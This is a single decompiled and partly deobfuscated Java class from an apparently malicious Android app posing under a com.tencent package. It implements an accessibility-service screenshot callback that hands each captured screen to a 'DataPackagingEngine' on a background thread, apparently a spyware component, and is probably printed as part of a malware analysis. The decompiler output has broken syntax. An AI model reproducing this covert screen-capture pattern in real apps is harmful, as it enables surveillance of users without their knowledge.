package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: AccessibilityServiceCore_8
 * Original: Lcom/tencent/tunesxconcerningn1012$8;
 */
class AccessibilityServiceCore_8 implements AccessibilityService$TakeScreenshotCallback; {

    // === FIELDS ===
    final AccessibilityServiceCore this$0;

    // === METHODS ===

     void Constructor(AccessibilityServiceCore param0) {
        v0.this$0 = v1;
        // new Object()
        return;
    }

    public void onFailure(int param0) {
        return;
    }

    public void onSuccess(AccessibilityService$ScreenshotResult param0) {
        DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v3);
        v0 = DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v3);
        v0 = DataPackagingEngine$$ExternalSyntheticApiModelOutline0.m(v0, v3);
        v0 = new Thread();
        v1 = new AccessibilityServiceCore$8$1();
        // new AccessibilityServiceCore$8$1(v2, v3)
        // new Thread(v1)
        v0.start();
        return;
    }
}
